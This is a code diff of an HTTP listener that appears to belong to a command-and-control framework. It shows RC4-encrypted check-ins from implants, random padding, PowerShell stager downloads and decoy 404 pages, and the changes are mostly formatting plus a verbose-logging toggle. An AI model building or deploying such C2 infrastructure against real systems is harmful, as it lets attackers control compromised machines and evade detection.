@@ -61,11 +61,10 @@ def HTTPDFactory(config):
 
         def set_custom_headers(self):
             profile = self.config.get("profile")
+
             if not profile == "":
                 for item in profile.get("headers"):
-                    self.send_header(item,
-                            Utils.parse_random(profile.get("headers"
-                            )[item]))
+                    self.send_header(item, Utils.parse_random(profile.get("headers")[item]))
 
         def do_POST(self):
             if self.path.split("/")[1] == "api":
@@ -88,6 +87,7 @@ def HTTPDFactory(config):
                 return
 
             guid = ""
+
             try:
                 guid = Utils.validate_guid(data["ID"])
             except Exception as e:
@@ -100,19 +100,24 @@ def HTTPDFactory(config):
                 
                 output = ""
                 parser = HTTPDParser(config)
+
                 try:
                     output = parser.parse_cmd(guid, data["Data"], data["UUID"])
                 except:
                     pass
+
                 if not output == None:
                     uuid = output[:36]
                     output = output[37:]
                     self.output = base64.b64encode(self.rc4.crypt(output)).decode()
                     self.output = json.dumps({"UUID": uuid, "ID": guid, "Data": self.output})
+
                 else:
                     self.output = json.dumps({"UUID": None, "ID": guid,"Data": Utils.gen_str(random.randrange(10,1000))})
+
                 self.return_json()
                 return
+
             else:
                 self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
 
@@ -129,6 +134,7 @@ def HTTPDFactory(config):
             path = self.path.split("/")[-1]
             payload_path = self.path.split("/")
             filename = Utils.gen_str(12)
+
             if payload_path[1] == self.config.get("http-download-path"):
                 force_download = True
                 extension = "ps1"
@@ -152,10 +158,12 @@ def HTTPDFactory(config):
                 Log.log_event("Download Stager", "Stager was fetched from %s (%s). Stager type is %s" % (self.client_address[0], self.address_string(), extension))
 
                 self.output = payload.get_output()
+
             elif path in Utils.get_download_folder_content():
                 force_download = True
                 self.output = Utils.load_file("download/%s" % path)
                 Log.log_event("Download File", "%s was downloaded from %s (%s)" % (path, self.client_address[0], self.address_string()))
+
             else:
                 self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
                 Log.log_error("Invalid request got a GET request", self.path)
@@ -181,7 +189,8 @@ def HTTPDFactory(config):
             self.wfile.write(self.output.encode())
 
         def log_message(self, format, *args):
-            Log.log_http_request(self.client_address[0], self.address_string(), args[0])
+            if self.config.get("verbose").lower() == "on":
+                Log.log_http_request(self.client_address[0], self.address_string(), args[0])
             return
 
     return HTTPD
